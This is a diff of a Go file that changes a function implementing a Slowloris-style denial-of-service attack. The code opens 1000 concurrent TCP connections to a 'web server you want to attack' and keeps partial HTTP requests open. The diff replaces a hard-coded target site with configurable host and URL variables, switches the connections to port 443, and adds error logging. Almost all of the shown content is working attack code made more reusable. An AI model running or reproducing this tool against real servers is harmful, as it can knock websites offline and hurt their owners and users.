@@ -8,7 +8,7 @@ import (
 )
 
 func slow1() {
-	// req, err := http.NewRequest("GET", "https://thawdezin.netlify.app", nil)
+	// req, err := http.NewRequest("GET", _url, nil)
 	// if err != nil {
 	// 	fmt.Printf("Error creating request: %s\n", err)
 	// }
@@ -22,7 +22,7 @@ func slow1() {
 	// 	fmt.Println(string(data))
 	// }
 
-	// req, err := http.NewRequest("GET", "https://thawdezin.netlify.app", nil)
+	// req, err := http.NewRequest("GET", _url, nil)
 	// if err != nil {
 	// 	fmt.Printf("Error creating request: %s\n", err)
 	// }
@@ -39,7 +39,7 @@ func slow1() {
 	// client := &http.Client{
 	// 	Timeout: 100 * time.Second,
 	// }
-	// response, err := client.Get("https://thawdezin.netlify.app")
+	// response, err := client.Get(_url)
 	// if err != nil {
 	// 	fmt.Printf("The HTTP request failed with error %s\n", err)
 	// } else {
@@ -53,7 +53,7 @@ func slow1() {
 	// }
 	// // Send a partial HTTP request to the server and keep the connection open
 	// for {
-	// 	req, err := http.NewRequest("GET", "https://thawdezin.netlify.app", nil)
+	// 	req, err := http.NewRequest("GET", _url, nil)
 	// 	if err != nil {
 	// 		fmt.Println(err)
 	// 		return
@@ -73,7 +73,7 @@ func slow1() {
 	// }
 
 	// targetHost is the hostname or IP address of the web server you want to attack
-	targetHost := "thawdezin.netlify.app"
+	targetHost := _host
 
 	// Number of connections to open to the server
 	numConnections := 1000
@@ -84,10 +84,10 @@ func slow1() {
 	// Set up a connection to the target host
 	conn, err := net.Dial("tcp", targetHost+":443")
 	if err != nil {
-		fmt.Println(err)
+		//fmt.Println(err)
+		newErr := fmt.Errorf("tcp Error in slow1: %v", err)
+		fmt.Println(newErr)
 		return
-	} else {
-		print("OK")
 	}
 	defer conn.Close()
 
@@ -106,9 +106,12 @@ func slow1() {
 	// Open numConnections number of connections to the server
 	for i := 0; i < numConnections; i++ {
 		go func() {
-			conn, err := net.Dial("tcp", targetHost+":80")
+			conn, err := net.Dial("tcp", targetHost+":443")
+			
 			if err != nil {
 				fmt.Println(err)
+				newErr := fmt.Errorf("Slow1 inner tcp Error: %v", err)
+				fmt.Println(newErr)
 				return
 			}
 			defer conn.Close()
